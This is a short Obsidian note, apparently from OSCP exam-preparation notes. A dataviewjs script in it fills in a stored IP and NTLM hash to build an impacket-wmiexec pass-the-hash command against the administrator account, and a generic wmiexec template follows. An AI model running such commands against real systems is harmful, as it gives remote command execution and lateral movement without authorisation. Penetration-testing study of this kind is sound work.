MODIFY: 
hash:: 823452073d75b9d1cf70ebdf86c7f98e
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit");
const hash = pagea?.["hash"] ?? "NO HASH FOUND";

const command = `impacket-wmiexec -hashes '${hash}' -dc-ip ${ip} administrator@${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
impacket-wmiexec 'DOMAIN/user:password@TARGET'
```

